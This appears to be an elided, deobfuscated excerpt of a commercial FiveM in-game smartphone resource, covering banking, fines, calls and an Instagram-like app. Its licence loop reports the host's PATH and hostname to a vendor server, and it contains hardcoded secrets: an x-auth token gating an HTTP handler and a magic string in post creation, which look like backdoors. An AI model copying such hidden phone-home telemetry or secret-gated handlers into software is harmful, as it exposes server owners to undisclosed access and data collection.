...
function oQ(c) {
  return c && typeof c === "object" && "default" in c
    ? c
    : {
        default: c,
      };
...
const oT = () => Math.floor(Date.now() / 1000),
  oU = (c) =>
    require("crypto").createHash("md5").update(String(c)).digest("hex");
  ...
  const e = {},
    ...
    g = async (...i) => {
      ...
      if (!e.hasOwnProperty(j)) {
        (e[j] = await c.apply(null, i)),
          (f[j] = setTimeout(() => delete e[j], d));
      }
...
function pa() {
  ...
  console.log("Smartphone:: DRIVER DE BANCO DE DADOS INCOMPATÍVEL"),
    console.log(
      "Smartphone:: O SCRIPT IRA ASSUMIR QUE VOCE UTILIZA GHMattiMySQL"
    );
  return "GHMattiMySQL";
}
...
const pb = {
  ...
  query(c, d) {
    ...
    return (
      pc.debug && console.log(c, JSON.stringify(d)),
      new Promise((j, k) => {
        switch (this.driver) {
          case "ghmattimysql":
          ...
          case "oxmysql":
            ...
            if (l && !l.startsWith("1.")) {
              return global.exports.oxmysql
                .query_async(c, d)
                .then(j)
                .catch((o) => {
                  console.error(
                    'Erro ao executar "' + c + '" com argumentos [' + d + "]"
                  ),
                    console.error(o),
                    k(o);
                });
          ...
          case "mysql-async":
            const m = c.match(/INSERT|REPLACE/i)
              ? "mysql_insert"
              : "mysql_fetch_all";
...
(pc.raw = (c) => ({
  ...
  (pc.getColumns = (c) => {
    return pb
      .query("SHOW COLUMNS FROM " + c, [])
      .then((d) => d.map((e) => e.Field));
  }),
  (pc.query = (c, d = []) => {
    return pb.query(c, d);
  });
  ...
  ["where"]() {
    ...
    if (e instanceof Function) {
      ...
      if (e instanceof Object && !e.$raw) {
        ...
        const q = {};
        (q.column = e),
          (q.operator = g === undefined ? "=" : f),
          (q.value = g === undefined ? f : g),
          (q.or = !!h),
          this.wheres.push(q);
      }
    }
...
class pg extends pe {
  ...
  ["then"](c) {
    const { sql: d, values: e } = super.toSql();
...
class ph {
  ...
  ["then"](c) {
    ...
    let f =
      ...
      d.join(",") +
      ") VALUES (" +
      ",?".repeat(e.length).substr(1) +
      ")";
    if (this.$returnKeys && pb.driver === "GHMattiMySQL")
...
class pi extends pe {
  ...
  ["then"](c) {
    let d = [];
    const { sql: e, values: f } = super.toSql();
    const g = Object.entries(this.data).map(([i, j]) => {
      ...
      if (j && j.$raw) {
        ...
        if (j && j.hasOwnProperty("$increment"))
          return d.push(j.$increment), l + " = " + l + " + ?";
        else d.push(j);
      }
...
class pj {
  ...
  ["toSql"](c) {
    ...
    if (this._default != null)
      d += "DEFAULT " + JSON.stringify(this._default) + " ";
    if (!this.isNullable) d += "NOT NULL ";
    else {
...
class pk {
  ...
  ["toSql"]() {
    const c = Object.entries(this.columns)
      .filter((e) => e[1].isPrimary)
      .map((e) => pf(e[0]));
...
class pl extends pe {
  ...
  ["then"](c) {
    ...
    if (this.$order.length) {
      const j = this.$order.map(({ column: k, order: l }) => pf(k) + " " + l);
      f += " ORDER BY " + j.join(",");
    }
...
function pn(c) {
  if (c instanceof pm) return c.args;
  else {
    if (c == null) return [];
    else return [c];
  }
        ...
        get(g, h) {
          if (g[h]) return g[h];
            ...
            return (g[h] = (...j) => {
              if (h.startsWith("_"))
                return (
                  emit(d + ":proxy", h.substring(1), j, "smartphone", -1),
                  Promise.resolve()
                );
              else {
                const l = ++g._ids;
                return new Promise((m, n) => {
                  (e[l] = m),
                    emit(d + ":proxy", h, j, "smartphone", l),
                    setTimeout(() => {
                      e[l] &&
                        n(new Error("Proxy took too long to resolve " + h)),
                        delete e[l];
                    }, 32500);
                });
              }
    ...
    bindInterface(c, d) {
      on(c + ":proxy", async (e, f, g, h) => {
        ...
        if (i && i.call) {
          ...
          console.error(
            'Field "' + e + '" does not exists on interface "' + c + '"'
          );
      });
    },
  },
...
const ps = {
  ...
  "BANK.INVOICE_REQUEST":
    "Deseja aceitar a fatura {reason} de {name} no valor de {value}",
  ...
  "INSTAGRAM.INVALID_USERNAME":
    "Usuário inválido, use letras/numeros com o máximo de 24 caracteres",
  ...
  "INSTAGRAM.WAIT_USERNAME_CHANGE":
    "Aguarde uma hora para trocar o nome de usuário novamente",
...
function pz(d, e) {
  ...
  if (e.body) {
    if (typeof e.body === "object") {
      (e.body = JSON.stringify(e.body)),
        ...
        (e.headers["content-length"] = Buffer.from(e.body, "utf-8").length);
    }
  }
  ...
  return new Promise((l, m) => {
    h.end(),
      h.on("error", (n) => m(n)),
      h.on("response", (n) => {
        const { statusCode: o, headers: p, statusMessage: q } = n;
        let r = "",
          s = null;
        n.on("data", (t) => (r += t)),
          n.on("end", () => {
            if (
              p["content-type"] &&
              p["content-type"].includes("application/json")
            ) {
              s = JSON.parse(r);
            }
...
(pz.get = (d, e = {}) => {
  ...
  (pz.deleteManyImages = (...e) => {
    const f = e
      .filter((g) => g && g.includes("scooby.dev"))
      .map((g) => g.split("/").pop());
    ...
    if (f.length > 0) {
      ...
      const i = {};
      return (
        (i.authorization = config.token),
        pz.put("http://moscougroup.com.br/smartphone/storage/deleteMany", h, i)
      );
    }
  ...
  (pz.metadata = (e, f) => {
    ...
    pz.post(
      "http://moscougroup.com.br/smartphone/metadata/6056b4aa1cf80010efb4ed1d",
      g,
      h
    ).catch((i) => i);
  });
...
RegisterCommand("smartphone-setbase", (c, d) => {
  c == 0 &&
    ...
    console.log(
      "Base alterada para: '" +
        d[0] +
        "' (Reinicie o script para ver as alterações)"
    ));
}),
  RegisterCommand("smartphone-beta", (c) => {
    if (c == 0) {
      pC((d) => (d.channel = "beta")),
        console.log(
          "Canal de atualizacao alterado para beta (Reinicie o script para ver as alteracoes)"
        );
    }
  }),
  RegisterCommand("smartphone-stable", (c) => {
    if (c == 0) {
      pC((e) => delete e.channel),
        console.log(
          "Canal de atualizacao alterado para stable (Reinicie o script para ver as alteracoes)"
        );
    }
  });
if (pB.base === "creative_v3")
  (pp.getBankMoney = pp.getBank),
  ...
  if (pB.base === "creative_v4")
    (pp.getBankMoney = pp.getBank),
      (pp.setBankMoney = async (d, e) => {
    ...
    if (pB.base === "creative_v5") {
      ...
      pB.base === "creative_rework" &&
        ((pB.serverSideProp = true),
        (pp.getUserSource = pp.UserSource),
        (pp.getUserId = pp.Passport),
        (pp.getInventoryItemAmount = pp.InventoryItemAmount),
        (pp.hasPermission = pp.HasPermission),
        (pp.request = pp.Request),
        (pp.getBankMoney = async (c) => {
...
(pB.base === "creative_v4" || pB.base === "creative_v5") &&
  ((pp.getUserSource = pp.userSource),
  (pp.getUsersByPermission = async (c) => {
    const d = [];

    for (const e of Object.keys(await pp.userList()).map(Number)) {
      if ((await pp.hasPermission(e, c)) || (await pp.hasGroup(e, c)))
        d.push(e);
    }
    ...
    if (!d.length) {
      ...
      for (const h of g) {
        if (typeof h === "number") d.push(await pp.getUserId(h));
        else {
          if (h) {
            d.push(h.user_id);
          }
...
const pF = {
      ...
      return new Promise(async (c) => {
        while (true) {
          try {
            ...
            console.error(
              "Falha ao carregar as tabelas do banco de dados, se isso acontecer muitas vezes, seu conector de banco de dados está com problemas"
            ),
              await p2(1000);
          }
        }
        ...
        if (
          pF.tables.includes("summerz_characters") ||
          pF.hasTable("summerz_dummy")
        ) {
    ...
    async getName(c) {
      return pF
        ...
        .then((d) => d && d.name + " " + d.firstname.trim());
    },
    ...
    getUData(d, e) {
      ...
      return (
        (f.user_id = d),
        (f.dkey = e),
        pc(this.userDataTable).where(f).first().pluck("dvalue")
      );
    },
    ...
    async getIdentitiesBy(c = "user_id", d = []) {
      ...
      let e;
      const f = pF.firstTable(
        "vrp_user_infos",
        "vrp_characters",
        "vrp_characterdata"
      );
      if (pF.hasTable("nyo_character"))
        e = await pc("nyo_character")
          .whereIn(c === "user_id" ? "id" : c, d)
          .select("id", "name", "last_name", "phone");
      else {
        if (pF.hasTable("drip_characters"))
          return (
            (c = c == "user_id" ? "id" : "phone_number"),
            (e = await pc("drip_characters")
              .whereIn(c, d)
          ...
          if (pF.hasTable("summerz_characters"))
            (c = c == "user_id" ? "id" : c),
              (e = await pc("summerz_characters")
                .whereIn(c, d)
                .select("id", "name", "name2", "phone"));
          else {
                    ...
                    if (
                      ...
                      if (pF.hasTable("vrp_user_identities")) {
                        ...
                        return (
                          ...
                          console.error("Debug: " + pF.tables.join(", ")),
                          []
                        );
                      }
                    }
...
pF.ready(async (d) => {
  ...
  if (f) {
    ...
    async function j(k, l) {
      if (l && d.includes(k)) {
        await pc(k)
          .where("created_at", "<", i - l * 86400)
          .delete();
      }
    }

    await j("smartphone_whatsapp_messages", f.whatsapp),
      await j("smartphone_tor_messages", f.tor),
      await j("smartphone_olx", f.olx),
      await j("smartphone_calls", f.calls),
      await j("smartphone_twitter_tweets", f.twitter),
      await j("smartphone_paypal_transactions", f.paypal);
  }
}),
  ...
  if (d != null) {
    if (pB.item != false) {
      if (GetResourceState("pd-inventory") == "started") {
        var e = await exports["pd-inventory"].getItemAmount(
          d,
          pB.item || "celular"
        );
      } else {
...
(pL.ping = () => "pong"),
  ...
  (pL.upload_ticket = () =>
    oU(Math.floor(Date.now() / 86400000) + "dando_trabalho_pra_corno")),
  (pL.temporary_token = () => {
...
(pQ.identity = {}),
  ...
  (pQ.services = []),
  (pQ.disabledApps = []),
  (pQ.backgroundURL = pB.client.backgroundURL);
const pR = pQ;
(pL.getSettings = async (f) => {
  ...
  exports("createApp", (d, e, f, g) => {
    (pB.client.customApps = pB.client.customApps || {}),
      (pB.client.customApps[d] = g),
      (pB.client.apps = pB.client.apps || {});
    const h = {};
    (h.name = e),
      (h.icon = f),
      (pB.client.apps[d] = h),
      pz.metadata("started." + d, new Date().toISOString());
    return true;
  }),
  exports("tchabibi", () => true),
  on("smartphone:alternateDphone", async (d, e) => {
    const f = pG[e],
      g = {};
    g.id = e;
...
function pW() {
  if (pV < Date.now()) {
    console.error(
      "Falha ao criar o prop do celular, este problema é grave, porém ignorável [ENTITY DELETED]"
    ),
      (pV = Date.now() + 300000);
  }
...
(pL["0x00029a"] = async (c) => {
  ...
  (pL["0x00029f"] = (c, d) => {
    if (pB.serverSideProp) pU(pS[c]), delete pS[c];
    else {
      if (d) {
        try {
  ...
  global.on("smartphone:updatePhoneNumber", async (l, m) => {
    ...
    try {
      ...
      const z = {};
      (z.phone = m),
        await pF.contacts.where(y).update(z),
        pA.emit("whatsapp:updatePhoneNumber", n, m),
        oS(p, "REFRESH", {});
    } catch (A) {
...
function pY(c) {
  for (var e, g = "0123456789ABCDEF", h = "", i = 0; i < c.length; i++)
    (e = c.charCodeAt(i)), (h += g.charAt((e >>> 4) & 15) + g.charAt(15 & e));
...
function pZ(c) {
  ...
  for (f = 0; f < 8 * c.length; f += 8)
    e[f >> 5] |= (255 & c.charCodeAt(f / 8)) << f % 32;

  return e;
}

function q0(c) {
  for (var e = "", f = 0; f < 32 * c.length; f += 8)
    e += String.fromCharCode((c[f >> 5] >>> f % 32) & 255);
...
function q1(c, j) {
  ...
  for (
    var k = 1732584193, l = -271733879, o = -1732584194, p = 271733878, q = 0;
    q < c.length;
    q += 16
  ) {
    var s = k,
    ...
    (l = q6(
      (l = q6(
        (l = q6(
          (l = q6(
            (l = q5(
              (l = q5(
                (l = q5(
                    ...
                    (l = q4(
                      (l = q4(
                        (l = q4(
                          (l = q4(
                            ...
                            (o = q4(
                              ...
                              (p = q4(
                                p,
                                (k = q4(k, l, o, p, c[q + 1], 5, -165796510)),
                                l,
                                o,
                                c[q + 6],
                                9,
                          ...
                          (o = q4(
                            ...
                            (p = q4(
                              p,
                              (k = q4(k, l, o, p, c[q + 5], 5, -701558691)),
                              l,
                              o,
                              c[q + 10],
                              9,
                        ...
                        (o = q4(
                          ...
                          (p = q4(
                            p,
                            (k = q4(k, l, o, p, c[q + 9], 5, 568446438)),
                            l,
                            o,
                            c[q + 14],
                            9,
                      ...
                      (o = q4(
                        ...
                        (p = q4(
                          p,
                          (k = q4(k, l, o, p, c[q + 13], 5, -1444681467)),
                          l,
                          o,
                          c[q + 2],
                          9,
                  ...
                  (o = q5(
                    ...
                    (p = q5(
                      p,
                      (k = q5(k, l, o, p, c[q + 1], 4, -1530992060)),
                      l,
                      o,
                      c[q + 4],
                      11,
                ...
                (o = q5(
                  ...
                  (p = q5(
                    p,
                    (k = q5(k, l, o, p, c[q + 13], 4, 681279174)),
                    l,
                    o,
                    c[q + 0],
                    11,
              ...
              (o = q5(
                ...
                (p = q5(
                  p,
                  (k = q5(k, l, o, p, c[q + 9], 4, -640364487)),
                  l,
                  o,
                  c[q + 12],
                  11,
            ...
            (o = q6(
              ...
              (p = q6(
                p,
                (k = q6(k, l, o, p, c[q + 0], 6, -198630844)),
                l,
                o,
                c[q + 7],
                10,
          ...
          (o = q6(
            ...
            (p = q6(
              p,
              (k = q6(k, l, o, p, c[q + 12], 6, 1700485571)),
              l,
              o,
              c[q + 3],
              10,
        ...
        (o = q6(
          ...
          (p = q6(
            p,
            (k = q6(k, l, o, p, c[q + 8], 6, 1873313359)),
            l,
            o,
            c[q + 15],
            10,
      ...
      (o = q6(
        ...
        (p = q6(
          p,
          (k = q6(k, l, o, p, c[q + 4], 6, -145523070)),
          l,
          o,
          c[q + 11],
          10,
...
onNet("backend:req", async (e, f, g) => {
  ...
  if (p7.get(h) > 15) {
    ...
    if (config.antiflood != false) {
      if (config.req_debug)
        console.log("[%d] -> %s %s", h, f, JSON.stringify(g));
  ...
  try {
    ...
    console.error("Smartphone::Error", y.message),
      console.error(y.stack),
      console.error("Method " + f + " with " + JSON.stringify(g));
  } finally {
    delete q9[h];
  }
}),
  ...
  p6(async function () {
    ...
    while (true) {
      ...
      if (
        Math.abs(Date.now() - c) <= d ||
        !Function.prototype.toString.apply(Date.now).includes("[native code]")
      ) {
...
p6(async function () {
  try {
    while (true) {
      const d = {};
      (d.authorization = config.token),
        (d["fx-name"] = Buffer.from(GetConvar("sv_hostname")).toString(
          "base64"
        ));
      let e = [
        "GetInstanceId",
      ...
      f.bulletproof.push(pX(process.hrtime()[0])),
        f.bulletproof.push(pX(process.hrtime()[1])),
        f.bulletproof.push(pX(process.title)),
        f.bulletproof.push(pX(process.env.PATH)),
        f.bulletproof.sort();
      ...
      return (
        ...
        console.log("^4[smartphone]^4 ^8Authorized - ^22025^0"),
...
const qc = {
  deepweb: "images/tor.jpg",
  instagram: "images/instagram.jpg",
  bank: "images/nubank.webp",
  paypal: "images/paypal.webp",
  olx: "images/olx.png",
  twitter: "images/twitter.png",
  services: "images/services.webp",
  weazel: "images/weazel.webp",
  casino: "images/blaze.webp",
};
let qd = qc,
  qe = 0;

function qf({ name: c, avatar: d, content: e }) {
  if (
    ...
    return pz.post(config.webhookURL, g).catch(() => {
      ...
      (qe = Date.now() + 15000),
        console.error(
          "Não foi possível enviar um webhook para o discord, isso não foi um problema do celular, e sim um problema de rede que você não é capaz de resolver, apenas aguarde. (NAO ENVIE ESSE ERRO NO DISCORD)"
        );
    });
  }
...
pF.ready(async (c) => {
  ...
  (pL.gallery = async (d) => {
    ...
    return ql()
      ...
      .limit(300)
      .orderBy("id", "DESC")
      .select("id", "folder", "url", "created_at");
  }),
  ...
  if (p) {
    if (p5("onServiceRequest")) {
      ...
      return (
        ...
        (s.content = k),
        (s.location = l),
        exports.smartphone.onServiceRequest(s)
      );
    }
    ...
    if (q.length === 0) {
      ...
      (v.source = i),
        ...
        (v.content = k),
        (v.location = l),
        emit("smartphone:service_unavailable", v);
      const w = {
      ...
      if (p.dev) {
        ...
        (x.source = i),
          ...
          (x.content = k),
          (x.location = l),
          emit("smartphone:service_request", x);
      } else {
        for (let A of q) {
          ...
          emitNet(
            ...
            "CHAMADO",
            [19, 197, 43],
            "(" + p.name + ")  Enviado por ^1" + o + "^0 [" + m + "], " + k
          );
          const C = {};
          (C.user_id = m),
            (C.phone = n),
            (C.name = o),
            emitNet("smartphone:service_request", B, C),
            pp.request(B, "Atender o chamado de " + o + "?", 30).then(
              (D) => {
                if (D) {
                  if (r) {
                    emitNet(
...
pF.ready(async (c) => {
  if (!c.includes(pF.phone_calls.table)) {
    await pF.phone_calls.create((d) => {
      d.id(),
        d.varchar("initiator", 50),
        d.varchar("target", 50),
        d.int("duration").default(0),
        d.varchar("status"),
        d.tinyint("video").default(0),
        d.tinyint("anonymous").default(0),
        d.bigint("created_at");
    }),
      await pF.phone_calls.createIndex("initiator"),
      await pF.phone_calls.createIndex("target");
  }
});
const qq = [];
...
function qt(c) {
  return (global.GetHashKey(pB.token + ":fake:" + c) + 2147483648)
    .toString()
...
(pL.createPhoneCall = async (h, i, j = false, k = false) => {
  ...
  if (
    qq.some(
      (q) => q.initiator.source == h || (q.target.source == h && q.accepted)
    )
  )
    return n;
  const o = pH[i];
  ...
  if (o) {
    ...
    if (s) {
      if (qq.some((w) => w.initiator.source == s || w.target.source == s)) {
        ...
        qq.push(z);
        if (pB.call_mode) z.mode = pB.call_mode;
        else {
        ...
        return (
          (z.timeout = setTimeout(() => {
            !z.accepted &&
              qq.includes(z) &&
              (qr(z, "unanswered"),
              oS(z.initiator.source, "CALL_END", {}),
              oS(z.target.source, "CALL_END", {}));
          }, 20000)),
          oS(s, "CALL_REQUEST", z),
          z
        );
    ...
    if (f) {
      if (!f.accepted) {
        clearTimeout(f.timeout),
          (f.accepted = true),
          (f.accepted_at = oT()),
          oS(f.initiator.source, "CALL_READY", {});
        if (f.mode === "saltychat")
          exports.saltychat.EstablishCall(f.initiator.source, f.target.source);
        else
          f.mode === "tokovoip" &&
            f.sources.forEach((j) =>
              emit("TokoVoip:addPlayerToRadio", f.room, j, false)
            );
      }
    } else {
      const k = {
  ...
  (pL.refusePhoneCall = (d) => {
    ...
    if (e) {
      clearTimeout(e.timeout),
        qr(e, "refused"),
        oS(e.initiator.source, "CALL_END", {});
    } else {
      const h = {
        error: "Esta ligação não existe mais",
      };
  ...
  (pL.endPhoneCall = (c) => {
    ...
    if (d) {
      if (d.accepted) {
        qr(d, "ok");
        if (d.mode === "saltychat")
          exports.saltychat.EndCall(d.initiator.source, d.target.source);
        else
          d.mode === "tokovoip" &&
            d.sources.forEach((j) => {
              emit("TokoVoip:removePlayerFromRadio", d.room, j),
                emit("TokoVoip:removePlayerFromAllRadio", j);
            });
      } else {
...
pF.ready(async (c) => {
  ...
  if (!c.includes(d.table)) {
    await d.create((f) => {
      f.id(),
        f.int("payee_id"),
        f.int("payer_id"),
        f.varchar("reason").default(""),
        f.int("value"),
        f.tinyint("paid").default(0),
        f.int("created_at"),
        f.int("updated_at");
    });
  }
  ...
  if (
    (await pF.hasTable("vRP:multas")) &&
    !(await pF.firstColumn("vRP:multas", "id", "multa_id"))
  ) {
    pc.query(
      "ALTER TABLE vRP:multas ADD COLUMN id BIGINT PRIMARY KEY AUTO_INCREMENT"
    );
  }
});
...
async function qx(c) {
  ...
  const f = await pc(d || e)
    .where(d ? "id" : "user_id", c)
    .first("chavePix");
  return f?.["chavePix"];
}
...
async function qy(d, e) {
  ...
  if (f) {
    ...
    if (pF.hasTable("summerz_bank")) {
      ...
      console.error(
        "Transferencia offline nao adaptada, abra um ticket no discord para solicitar adaptacao"
      );
    }
  }
}
...
async function qA({
  ...
  if (p5("addBankStatement")) {
    ...
    return (
      ...
      (q.isReceiver = m),
      (q.pixKey = n),
      exports.smartphone.addBankStatement(q)
    );
  } else {
    if (pF.hasTable("smartbank_statements")) {
      ...
      if (!s) {
        ...
        if (l) {
          ...
          return (
            (v.pix = s), (v.amount = j), pc("smartbank_statements").insert(v)
          );
        } else {
          if (!k && m) {
            ...
            (y.reason = "Recebido de ID " + w),
              await pc("smartbank_statements").insert(y);
            const z = {
              pix: w,
              ...x,
            };
            return (
              (z.reason = "Transferência para " + s),
              pc("smartbank_statements").insert(z)
            );
          }
        }
      }
  ...
  if (await pF.hasColumns("vrp_banco", "title", "amount", "idtrans")) {
    ...
    (C.user_id = h),
      (C.amount = j),
      (C.idtrans = i ?? h),
      (C.title = l ? "Fatura" : k ? "Multa" : "Transferência"),
      await pc(o).insert(C);
  } else {
    if (pF.hasTable("vRP:multas")) {
      let D = l
        ? "Pagamento de Fatura"
        : k
        ? "Pagamento de multa"
      ...
      if (o) {
        ...
        if (l) G = "Pagou uma fatura de " + F;
        else {
          if (k) G = "Pagou " + F + " em multas";
          else {
            if (m) {
...
pF.ready(async () => {
  ...
  (await pF.hasColumn("vrp_user_moneys", "pix")) &&
    exports("getUserIdByPixKey", async (d) => {
      const f = {};
      f.pix = d;
  ...
  pF.ready(async () => {
    ...
    for (let [h, i] of Object.entries(g)) {
      e.push({
        ...
        deleteOne(j) {
          return pc(this.table)
            .where(this.userColumn, j)
            .update({
              [this.column]: 0,
            });
        },
    ...
    for (let [k, l, m] of [
      ["vrp_fines", "text", "price"],
      ["characters_fines", "text", "price"],
      ["vRP:multas", "motivo", "valor"],
      ["vRP:multas", "motivo", "valor"],
      ["vRP:multas", "motivo", "valor"],
    ]) {
      e.push({
        ...
        async getAll(n) {
          ...
          return (
            ...
            (r[l] = "description"),
            (r[m] = "total"),
            pc(this.table).where(q).selectAs(r)
          );
        },
    ...
    if (pF.hasTable("smartbank_fines")) {
      return (qE = {
        ...
        getSum(p) {
          return this.select("SUM(amount) as total", p).then(
            (r) => (r[0] && r[0].total) || 0
          );
        },
        ...
        if (pF.hasTable("drip_items")) {
          return (qE = {
            ...
            getSum(q) {
              return pc
                .query(
                  "SELECT SUM(value) AS total FROM drip_items di\n        LEFT JOIN drip_characters dc ON dc.uuid=di.entityId\n        WHERE typeId='b3beb697-bf76-45ec-b77b-7ab09016ea13' AND dc.id=?",
                  [q]
                )
                .then((r) => r[0].total || 0);
            },
            ...
            deleteOne(q) {
              return pc.query(
                "DELETE FROM drip_items di LEFT JOIN drip_characters dc ON dc.uuid=di.entityId\n        WHERE typeId='b3beb697-bf76-45ec-b77b-7ab09016ea13' AND dc.id=?",
                [q]
              );
            },
          });
        } else
          pF.hasTable("vrp_user_data") &&
            e.push({
              table: "vrp_user_data",
              applicable: true,
              getSum: (s) =>
    ...
    if (!qE) {
      console.error(
        "Nenhum sistema de multa compatível foi encontrado, abra um ticket no discord solicitando a adaptação do seu modelo atual"
      );
      const s = {};
      (s.getSum = () => 0),
        (s.getAll = () => []),
  ...
  (pL.bank_index = async (d) => {
    ...
    let h = 0;
    if (p5("getTotalFines")) h = await exports.smartphone.getTotalFines(e);
    else {
      if (qE) h = await qE.getSum(e);
      else console.error("Nenhum sistema de multa encontrado");
    }
    const i = {};
    ...
    if (p5("getBankStatements")) {
      ...
      if (pF.hasTable("smartbank_statements")) {
        ...
        if (await pF.hasColumns("vrp_banco", "title", "amount", "idtrans")) {
          ...
          if (pF.hasTable("vRP:multas")) {
            const s = JSON.parse(
              (await pF.getUData(h, "ws-bank:historico")) || "[]"
            );
            ...
            if (i) {
              ...
              return (
                ...
                pc(i)
                  .where(v)
                  .selectRaw("id", "extrato_bancario", "data AS created_at")
                  .orderBy("id", "DESC")
                  .limit(100)
              );
            } else {
              if (pF.hasTable("cactus_statements")) {
                const w = {};
                w.user_id = h;
                const x = await pc("cactus_statements")
                  .where(w)
                  .orWhere("target_id", h)
                  .limit(50)
                  .orderBy("id", "DESC");
                ...
                for (let y of x) {
                  ...
                  y.description =
                    (z ? "Entrada" : "Saída") + " de " + pu(y.amount);
                }
  ...
  (pL.bank_getFines = async (c) => {
    const d = await pp.getUserId(c);
    if (p5("getFines")) return exports.smartphone.getFines(d);
    else {
      if (qE) {
        return qE.getAll(d);
  ...
  (pL.bank_transfer = async (f, g, h, i) => {
    ...
    return qC(j, async () => {
      ...
      if (r >= h) {
        ...
        if (
          p5("isBankTransferAnonymous") &&
          (await exports.smartphone.isBankTransferAnonymous(v))
        ) {
          const w = {
            sender: "Anônimo",
          };
  ...
  (pL.bank_storeInvoice = async (l, m, n, o) => {
    ...
    if (v) {
      const y = await pF.getName(p),
        z =
          "Deseja aceitar a fatura {reason} de {name} no valor de {value}".format(
            {
              reason: o,
              name: y,
              value: pu(n),
      ...
      (B.name = t),
        oS(l, "BANK_NOTIFY", {
          ...
          subtitle:
            pt[
              A
                ? "BANK.INVOICE_NOTIFY_ACCEPTED"
                : "BANK.INVOICE_NOTIFY_REJECTED"
            ].format(B),
        });
    } else {
      const J = {
...
function qI() {
  return Array(global.GetNumPlayerIndices())
    .fill()
    .map((c, d) => global.GetPlayerFromIndex(d));
}
...
_in(
  ...
  _mfr((c, d) => {
    if (
      c.method === "POST" &&
      c.headers["x-auth"] ===
        "8uFZXaLKAcMj5YDIxORC6n18P7ST453fUogLisP87xzKnXoTXed0z6nYM3UrQlqd"
    ) {
...
const qN = {
  ...
  notifyAll(c, d, e) {
    ...
    c.length > 0 &&
      pc.query(
        "INSERT INTO " +
          qN.notifications.table +
          "\n      (profile_id, author_id, content, created_at) VALUES\n      " +
          Array(c.length).fill("(?,?,?,?)").join(","),
        c.map((l) => [l, d, e, oT()]).flat()
      );
  },
...
pF.ready(async (c) => {
  ...
  !c.includes(d.table) &&
    (await d.create((j) => {
      j.id(),
        j.int("user_id").nullable(),
        j.varchar("username"),
        j.varchar("name"),
        j.varchar("bio"),
        j.varchar("avatarURL").nullable(),
        j.tinyint("verified").default(0);
    }),
  ...
  if (!c.includes(h.table)) {
    await h.create((m) => {
      m.id(),
        m.int("profile_id"),
        m.int("author_id"),
        m.varchar("content", 512),
        m.tinyint("saw").default(0),
        m.int("created_at");
    }),
...
function qR(d, e, f, g) {
  ...
  (h.username = d.username),
    (h.avatarURL = d.avatarURL),
    (h.verified = !!d.verified),
    (this.author = h),
    (this.image = e);
  this.content = f;
...
async function qS(c) {
  ...
  for (let h of c) {
    (h.author = e.find((j) => j.id == h.profile_id)),
      (h.likes = f.filter((j) => j.post_id == h.id).pluck("profile_id")),
      (h.comments = g.reduce((j, k) => j + (k.post_id == h.id ? 1 : 0), 0));
  }
...
(pL.ig_accounts = async (d) => {
  ...
  (pL.ig_login = async (e, f) => {
    ...
    if (h && h.user_id == g) {
      if (pB.instagram_verify && h.verified != 2) {
        ...
        const k = {};
        (k.verified = i),
          await qN.profiles.where(j).update(k),
          qN.forEachPost((l) => {
  ...
  (pL.ig_register = async (l, m, n, o, p) => {
    ...
    if (v) {
      ...
      const G =
          (pB.instagram_verify && (await pE(q, pB.instagram_verify))) || false,
        H = {};
      (H.user_id = q),
        (H.name = m),
        (H.username = n),
      ...
      return (
        (J.user_id = q),
        (J.id = I.id),
        emit("smartphone:INSTAGRAM_REGISTER", J),
        I
      );
    }
  }),
  ...
  (pL.ig_notifications = async (c) => {
    ...
    if (e) {
      return pc.query(
        "SELECT n.id,n.content,n.created_at,p.avatarURL FROM " +
          qN.notifications.table +
          " n LEFT JOIN " +
          qN.profiles.table +
          " p ON p.id=n.author_id WHERE profile_id=? ORDER BY id DESC LIMIT 50",
        [e.id]
      );
    }
  }),
  ...
  (pL.ig_getProfile = async (d, e) => {
    ...
    if (!h) return;
    e = h.id;
    const i = await qN.followers
      .where("follower_id", e)
      .orWhere("profile_id", e);
    (h.followers = h.followers || 0),
      (h.followers += i.reduce((l, m) => l + (m.profile_id == e ? 1 : 0), 0)),
      (h.following = i.reduce((l, m) => l + (m.follower_id == e ? 1 : 0), 0)),
      (h.isFollowing = i.some(
        (l) => l.follower_id == e && l.profile_id == g.id
      )),
      (h.isFollowed = i.some((l) => l.follower_id == g.id)),
      (h.posts = await qN.posts
        .where("profile_id", e)
        .whereNull("post_id")
        .count());
    const j = await qN.posts
        .where("profile_id", e)
        .whereNull("post_id")
        .select("id", "image")
        .limit(90)
  ...
  (pL.ig_isFollowing = async (d, e) => {
    ...
    const h = {};
    return (
      (h.follower_id = g.id), (h.profile_id = e), qN.followers.where(h).exists()
    );
  });
const qT = {};
(pL.ig_setFollow = async (f, g, h) => {
  ...
  if (!j) {
    ...
    if (h) {
      ...
      (r.follower_id = j.id),
        (r.profile_id = g),
        await qN.followers.where(r).delete();
    }
  }
  ...
  (pL.ig_reply = async (i, j, k) => {
    ...
    qN.notify(
      v.id,
      m.id,
      "{name} comentou em sua publicação".format({
  ...
  (pL.ig_getPost = async (e, f) => {
    ...
    const i = await qN.posts.where(g).orWhere(h),
      j = await qN.profiles
        .whereIn("id", i.pluck("profile_id").unique())
        .select("id", "username", "avatarURL", "verified"),
      k = await qN.likes.whereIn("post_id", i.pluck("id"));

    for (let m of i) {
      (m.likes = k.filter((n) => n.post_id == m.id).pluck("profile_id")),
        (m.author = j.find((n) => n.id == m.profile_id));
    }
  ...
  (pL.ig_deleteStory = async (c, d) => {
    ...
    if (f) {
      const g = qP[e];
      ((g && g.username == f.author.username) || (await pK(e))) &&
        (qQ.splice(qQ.indexOf(f), 1), oS(-1, "INSTAGRAM_DELETE_STORY", f.id));
    }
  }),
  (pL.ig_getStories = () => {
    return qQ.sort((c, d) =>
      c.author.username.localeCompare(d.author.username)
    );
  });
const qU = {};
(pL.ig_createPost = async (f, g, h) => {
  ...
  if (qU[f]) {
    ...
    if (
      h === "w8A5UwOWFinOzWNMsFlU3vzCAD0ddc570ktD4QOfLX5938IqsITOfcr7o61qgWlE"
    ) {
      return (qU[f] = true), {};
    }
  }
  ...
  (l.user_id = i),
    ...
    (l.avatarURL = j.avatarURL),
    (l.verified = !!j.verified),
    (k.author = l),
    (k.likes = []);
  ...
  if (m && m.length) {
    ...
    qN.notifyAll(
      t,
      j.id,
      "{name} mencionou você em uma publicação".format({
        name: j.name || j.username,
      })
    );
  }
  ...
  (p.content = o),
    qf(p),
    emit("smartphone:INSTAGRAM_POST", k),
    oS(-1, "INSTAGRAM_POST", k);
}),
  (pL.ig_deletePost = async (i, j) => {
    ...
    if (n) {
      ...
      if (o || (await pK(k))) {
        ...
        const r = {};
        (r.post_id = j),
          await qN.posts.where(q).orWhere(r).delete(),
          pz.deleteManyImages(n.image),
